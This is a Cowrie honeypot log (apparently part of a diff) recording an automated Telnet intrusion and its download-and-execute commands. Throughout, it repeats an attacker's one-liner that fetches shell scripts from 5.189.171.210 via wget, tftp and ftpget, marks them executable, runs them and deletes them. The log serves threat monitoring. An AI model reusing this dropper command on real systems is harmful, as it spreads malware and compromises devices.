+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:08+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:08+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:08+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:08+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:09+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:09+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:09+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:09+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:09+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:09+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:10+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:10+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:10+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:10+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:10+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:10+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:10+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:39840 (10.8.41.81:2222) [session: 7142dcda]
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] QUEUED INPUT: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:11+0000 [HoneyPotSSHTransport,33730,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-15T14:08:11+0000 [HoneyPotSSHTransport,33730,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-15T14:08:11+0000 [HoneyPotSSHTransport,33730,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-15T14:08:11+0000 [HoneyPotSSHTransport,33730,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Not storing duplicate content c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Downloaded URL (http://5.189.171.210/rgt.sh) with SHA-256 c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e to dl/c885f6b89171755320b5030efec94bb3d9435f535e5a53df9326b97b6e458e7e
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: sh /rgt.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: tftp 5.189.171.210 -c get bgr1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: sh bgr1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: tftp -r bgr2.sh -g 5.189.171.210
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: chmod +x bgr2.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: sh bgr2.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Downloaded URL (ftp://5.189.171.210/rgt1.sh) with SHA-256 f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd to dl/f93fd023f0ebf045f90fa8eb9494e15a4657ac031775f525f47ba022732e12cd
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: chmod +x /rgt1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: sh /rgt1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: rm -rf /rgt.sh bgr1.sh bgr2.sh /rgt1.sh
+2017-06-15T14:08:11+0000 [HTTPPageDownloader,client] Command found: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://5.189.171.210/rgt.sh; chmod +x rgt.sh; sh rgt.sh; tftp 5.189.171.210 -c get bgr1.sh; chmod +x bgr1.sh; sh bgr1.sh; tftp -r bgr2.sh -g 5.189.171.210; chmod +x bgr2.sh; sh bgr2.sh; ftpget -u ftp 5.189.171.210 rgt1.sh rgt1.sh; chmod +x rgt1.sh; sh rgt1.sh; rm -rf rgt.sh bgr1.sh bgr2.sh rgt1.sh
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /tmp
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /var/run
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /mnt
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /root
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: cd /
+2017-06-15T14:08:11+0000 [CowrieTelnetTransport,57560,125.227.194.33] Command found: wget http://5.189.171.210/rgt.sh
+2017-06-15T14:08:11+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://5.189.171.210/rgt.sh>
